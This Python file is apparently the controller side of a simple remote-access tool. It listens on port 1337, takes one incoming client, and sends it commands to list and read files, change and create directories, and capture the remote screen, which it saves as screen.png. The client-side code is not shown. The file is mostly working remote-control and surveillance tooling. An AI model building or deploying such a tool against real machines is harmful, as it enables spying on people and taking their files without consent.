import socket
import time
import io
import base64
import os
from PIL import Image
from colorama import Fore, Style, init

ADRESSE = "192.168.1.1"
PORT = 1337

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((ADRESSE, PORT))
server.listen(1)

client, adresseClient = server.accept()
print(f"Connexion de {adresseClient}")


def recieveResponse():
    data = b""
    while True:
        part = client.recv(1024)
        data += part
        if len(part) < 1024:
            # Either 0 or end of data
            break
    return data


def recieveDataFromScreen():
    dataScreen = b""
    while True:
        part = client.recv(1024)
        dataScreen += part
        if len(part) < 1024:
            break
    return dataScreen


def recieveTextResponse():
    data = recieveResponse()
    return data.decode('utf-8')


def sendCmd(cmd):
    cmd = cmd.encode('utf-8')
    n = client.send(cmd)
    if n != len(cmd):
        print('Erreur lors de l\'envoi.')
        return
    else:
        # If theres a response from the client print it
        if cmd.decode('utf-8').split()[0] != 'screen':
            print(recieveTextResponse())
        time.sleep(0.1)


def writePngFile():
    img_bytes = base64.b64decode(recieveResponse())
    with open("screen.png", 'wb') as f:
        f.write(img_bytes)
    return


while True:
    cmd = input('Command to send : ')
    cmd_arr = cmd.split()

    try:
        match cmd_arr[0]:
            case 'close':
                sendCmd(cmd)
            case 'mkdir':
                sendCmd(cmd)
            case 'touch':
                sendCmd(cmd)
            case 'ls':
                sendCmd(cmd)
            case 'cd':
                sendCmd(cmd)
            case 'screen':
                sendCmd(cmd)
                time.sleep(0.2)
                writePngFile()
            case 'clear':
                os.system('cls')
            case 'cat':
                if len(cmd_arr) < 2:
                    print("Please enter a filename")
                else:
                    sendCmd(cmd)
    except IndexError:
        print('Error while parsing command.')
        continue


print('Fermeture de la connexion avec le client')
client.close()
print('Arret du serveur')
server.close()
